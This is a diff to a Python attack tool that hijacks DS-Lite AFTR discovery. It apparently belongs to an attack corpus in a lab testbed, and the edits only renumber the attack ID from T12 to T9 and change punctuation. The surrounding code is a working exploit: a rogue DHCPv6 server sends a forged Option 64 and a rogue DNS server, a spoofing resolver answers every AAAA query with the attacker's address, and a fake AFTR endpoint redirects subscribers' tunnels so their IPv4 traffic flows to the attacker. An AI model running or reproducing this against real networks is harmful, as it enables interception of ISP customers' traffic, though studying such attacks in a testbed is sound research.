@@ -1,25 +1,25 @@
 #!/usr/bin/python
-# T12 - AFTR Discovery Attacks
+# T9 – AFTR Discovery Attacks
 #
 # B4 elements discover their AFTR address through:
-#   a) DHCPv6 Option 64 (RFC 6334) - no cryptographic verification
-#   b) DNS resolution of AFTR FQDN - also unauthenticated
+#   a) DHCPv6 Option 64 (RFC 6334) – no cryptographic verification
+#   b) DNS resolution of AFTR FQDN – also unauthenticated
 #
 # RFC 6334 explicitly warns:
 #   "there is no basis for trusting DS-Lite configuration received via DHCPv6"
 #
 # Attack modes:
-#   dhcp  - Rogue DHCPv6 server: respond to B4 SOLICIT/REQUEST with a forged
+#   dhcp  – Rogue DHCPv6 server: respond to B4 SOLICIT/REQUEST with a forged
 #            Option 64 pointing to an attacker-controlled AFTR.
 #            B4 will build its DS-Lite tunnel to the fake AFTR instead of the
 #            legitimate one → all subscriber traffic flows to attacker.
 #
-#   dns   - DNS poisoning for AFTR FQDN: inject a forged DNS response for
+#   dns   – DNS poisoning for AFTR FQDN: inject a forged DNS response for
 #            'aftr.dslite.example.com' resolving to attacker's IPv6.
 #            This tool works on-path (sniff real DNS query, inject forged reply).
 #            Combined with dns_cache_poison.py for off-path scenarios.
 #
-#   race  - Race both methods simultaneously for maximum reliability.
+#   race  – Race both methods simultaneously for maximum reliability.
 #
 # Attacker position: ISP network (2001:db8:cafe::/64)
 #
@@ -65,7 +65,7 @@ from validate_parameters import is_valid_ipv6
 
 stop_event = threading.Event()
 served_count = 0
-banner_attack_id = "T12"
+banner_attack_id = "T9"
 served_lock = threading.Lock()
 
 
@@ -322,7 +322,7 @@ def run_rogue_dns(bind_ip6, fake_ip6, stop_evt):
     The rogue DHCPv6 ADVERTISE/REPLY also hands the victim B4 the attacker
     as its DNS server (Option 23). The B4's dhclient exit hook then resolves
     the advertised AFTR FQDN through THIS server, so we answer every AAAA
-    query with `fake_ip6` - the attacker's softwire endpoint. The B4 rebuilds
+    query with `fake_ip6` — the attacker's softwire endpoint. The B4 rebuilds
     its DS-Lite tunnel with remote=fake_ip6, i.e. straight to the attacker.
     """
     try:
@@ -331,10 +331,10 @@ def run_rogue_dns(bind_ip6, fake_ip6, stop_evt):
         s.bind((bind_ip6, 53))
         s.settimeout(1.0)
     except Exception as e:
-        print(f"[!] rogue DNS bind failed on [{bind_ip6}]:53 - {e}")
+        print(f"[!] rogue DNS bind failed on [{bind_ip6}]:53 — {e}")
         return
     rdata = socket.inet_pton(socket.AF_INET6, fake_ip6)
-    print(f"[*] rogue DNS up on [{bind_ip6}]:53 - AAAA * → {fake_ip6}")
+    print(f"[*] rogue DNS up on [{bind_ip6}]:53 — AAAA * → {fake_ip6}")
     while not stop_evt.is_set():
         try:
             data, addr = s.recvfrom(1500)
@@ -368,8 +368,8 @@ def run_rogue_dns(bind_ip6, fake_ip6, stop_evt):
 
 
 def run_dhcp_hijack(args):
-    """T12: Rogue DHCPv6 server injecting fake Option 64 (AFTR-name hijack)."""
-    print(f"[*] T12 - DHCPv6 AFTR Discovery Hijack")
+    """T9: Rogue DHCPv6 server injecting fake Option 64 (AFTR-name hijack)."""
+    print(f"[*] T9 – DHCPv6 AFTR Discovery Hijack")
     print(f"[*] Attacker IPv6:  {args.attacker_ip6}")
     print(f"[*] Fake AFTR FQDN: {args.fake_aftr_fqdn}")
     if hasattr(args, 'fake_aftr_ip6') and args.fake_aftr_ip6:
@@ -380,7 +380,7 @@ def run_dhcp_hijack(args):
     print("[!] Subscriber traffic will be tunneled to attacker, not legitimate AFTR")
     print()
 
-    # RFC 8415 §11.2 - Server DUID DUID-LLT (DUID Type 1: Link-layer + Time).
+    # RFC 8415 §11.2 — Server DUID DUID-LLT (DUID Type 1: Link-layer + Time).
     #   uint16 DUID_TYPE=1 | uint16 hw_type=1 (Ethernet) | uint32 time |
     #   var-len link-layer address (6 bytes for Ethernet).
     # The MAC must be a real interface MAC; we use a locally-administered
@@ -394,7 +394,7 @@ def run_dhcp_hijack(args):
     # Redirect mode: when a fake AFTR IPv6 is given, also run a rogue resolver
     # so the AFTR FQDN we advertise resolves to the attacker. With the rogue
     # DNS handed to the victim via Option 23, the B4 rebuilds its softwire with
-    # remote=fake_aftr_ip6 - a full data-plane redirect, not just a name change.
+    # remote=fake_aftr_ip6 — a full data-plane redirect, not just a name change.
     if getattr(args, 'fake_aftr_ip6', None):
         # Bring up the fake-AFTR endpoint on the attacker interface so the
         # redirected softwire actually lands on the attacker (otherwise the
@@ -415,7 +415,7 @@ def run_dhcp_hijack(args):
     # SOLICIT to the attacker port even with `multicast_snooping=0`, because
     # Linux bridges require an active MLD-report or an outbound multicast
     # join on the port before flooding that group. We use a throwaway
-    # socket bound to UDP/547 joined to ff02::1:2 - the kernel sends the
+    # socket bound to UDP/547 joined to ff02::1:2 — the kernel sends the
     # MLD report, the bridge installs a forwarding entry, and scapy's
     # subsequent sniff() sees the SOLICITs.
     _mcast_sock = None
@@ -572,8 +572,8 @@ def dns_packet_handler(pkt, args):
 
 
 def run_dns_hijack(args):
-    """T12: DNS AFTR FQDN poisoning (resolver-side AFTR hijack)."""
-    print(f"[*] T12 - DNS AFTR FQDN Hijack (on-path)")
+    """T9: DNS AFTR FQDN poisoning (resolver-side AFTR hijack)."""
+    print(f"[*] T9 – DNS AFTR FQDN Hijack (on-path)")
     print(f"[*] Watching for DNS AAAA queries for: {args.target_fqdn}")
     print(f"[*] Will respond with fake IPv6: {args.fake_ip6}")
     print()
@@ -600,7 +600,7 @@ def run_dns_hijack(args):
 
 def main():
     p = argparse.ArgumentParser(
-        description="T12 - AFTR Discovery Attacks (DHCPv6 Option 64 / DNS FQDN Hijacking)\n"
+        description="T9 – AFTR Discovery Attacks (DHCPv6 Option 64 / DNS FQDN Hijacking)\n"
                     "Redirects B4 CPE tunnel setup to attacker-controlled AFTR.",
         formatter_class=argparse.RawDescriptionHelpFormatter,
         epilog="""
@@ -633,7 +633,7 @@ Examples:
     )
     sub = p.add_subparsers(dest='mode', required=True)
 
-    dp = sub.add_parser('dhcp', help='T12: Rogue DHCPv6 server with fake Option 64 (AFTR-name hijack)')
+    dp = sub.add_parser('dhcp', help='T9: Rogue DHCPv6 server with fake Option 64 (AFTR-name hijack)')
     dp.add_argument('--interface', required=True, help='ISP interface (eth-isp)')
     dp.add_argument('--attacker-ip6', required=True, help="Attacker's IPv6 on ISP")
     dp.add_argument('--fake-aftr-fqdn', default='attacker.evil.com.',
@@ -645,7 +645,7 @@ Examples:
                          'this address is brought up on the attack interface, '
                          "and the victim B4 rebuilds its tunnel here so the "
                          "attacker intercepts the subscriber's IPv4 traffic.")
-    dp.add_argument('--attack-id', default='T12',
+    dp.add_argument('--attack-id', default='T9',
                     help='Corpus ID to tag results with')
     dp.add_argument('--auto-trigger-victim', metavar='NS',
                     help='After listener is armed, force the named B4 netns '
@@ -653,7 +653,7 @@ Examples:
                          'reply is consumed. Without this, the attack waits '
                          'silently for an organic SOLICIT.')
 
-    dnsp = sub.add_parser('dns', help='T12: DNS FQDN poisoning for AFTR resolution')
+    dnsp = sub.add_parser('dns', help='T9: DNS FQDN poisoning for AFTR resolution')
     dnsp.add_argument('--interface', required=True, help='ISP interface (eth-isp)')
     dnsp.add_argument('--attacker-ip6', required=True, help="Attacker's IPv6 on ISP")
     dnsp.add_argument('--target-fqdn', default='aftr.dslite.example.com',
@@ -663,7 +663,7 @@ Examples:
 
     args = p.parse_args()
     global banner_attack_id
-    banner_attack_id = getattr(args, "attack_id", "T12") or "T12"
+    banner_attack_id = getattr(args, "attack_id", "T9") or "T9"
 
     if not is_valid_ipv6(args.attacker_ip6):
         p.error(f'Invalid attacker-ip6: {args.attacker_ip6}')
